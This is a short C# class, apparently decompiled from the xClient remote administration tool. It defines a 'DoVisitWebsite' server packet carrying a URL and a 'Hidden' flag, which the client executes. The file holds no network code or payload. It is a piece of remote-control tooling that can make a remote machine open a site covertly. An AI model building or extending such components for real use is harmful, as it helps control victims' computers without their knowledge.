using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoVisitWebsite : GInterface4
{
	public string URL { get; set; }

	public bool Hidden { get; set; }

	public DoVisitWebsite()
	{
	}

	public DoVisitWebsite(string url, bool hidden)
	{
		URL = url;
		Hidden = hidden;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
